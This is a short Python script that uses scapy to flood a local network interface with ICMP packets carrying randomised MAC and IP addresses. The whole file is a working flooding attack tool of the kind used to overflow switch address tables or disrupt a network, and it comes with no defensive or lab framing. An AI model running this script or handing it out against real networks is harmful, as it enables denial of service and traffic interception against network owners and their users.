from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.volatile import RandIP, RandMAC


def flood(iface: str = "eth0", count: int = 1000):
    packet = (
        Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))
        / IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*"))
        / ICMP()
    )

    print(f"Flooding net with random packets on interface {iface}")
    sendp(packet, iface=iface, count=count)
